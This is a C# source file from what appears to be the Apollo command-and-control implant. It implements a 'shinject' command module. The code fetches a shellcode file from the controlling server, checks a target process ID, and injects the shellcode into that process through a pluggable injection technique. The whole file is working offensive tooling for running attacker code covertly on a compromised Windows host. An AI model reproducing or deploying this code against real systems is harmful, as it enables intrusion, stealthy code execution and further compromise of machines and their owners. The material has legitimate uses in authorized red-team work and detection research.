#define COMMAND_NAME_UPPER

#if DEBUG
#undef SHINJECT
#define SHINJECT
#endif

#if SHINJECT

using Apollo.Jobs;
using Apollo.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Runtime.InteropServices;

namespace Apollo.CommandModules
{
    public class Shellcode
    {
        /// <summary>
        /// Execute arbitrary shellcode into the local process.
        /// </summary>
        /// <param name="job">Job associated with this task.</param>
        /// <param name="agent">Agent associated with this task.</param>
        public static void Execute(Job job, Agent agent)
        {
            Task task = job.Task;
            int pid;
            byte[] sc;
            string fileId;

            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);
            pid = json.Value<int>("pid");
            fileId = json.Value<string>("shellcode");

            if (pid < 0)
            {
                job.SetError("Invalid PID given.");
                return;
            }

            try
            {
                var temp = System.Diagnostics.Process.GetProcessById(pid);
            } catch (Exception ex)
            {
                job.SetError($"Failed to get process with pid {pid}. Reason: {ex.Message}");
                return;
            }

            if (string.IsNullOrEmpty(fileId))
            {
                job.SetError("No shellcode file could be determined.");
                return;
            }

            sc = agent.Profile.GetFile(task.id, fileId, agent.Profile.ChunkSize);
            if (sc == null || sc.Length == 0)
            {
                job.SetError("Error fetching file or file was empty.");
                return;
            }

            var injectionType = Injection.InjectionTechnique.GetInjectionTechnique();
            var injectionHandler = (Injection.InjectionTechnique)Activator.CreateInstance(injectionType, new object[] { sc, (uint)pid });
            if (injectionHandler.Inject())
            {
                job.SetComplete($"Successfully injected shellcode into {pid}");
            } else
            {
                job.SetError($"Failed to inject shellcode into {pid}. Error code: {Marshal.GetLastWin32Error()}");
            }
        }

    }
}
#endif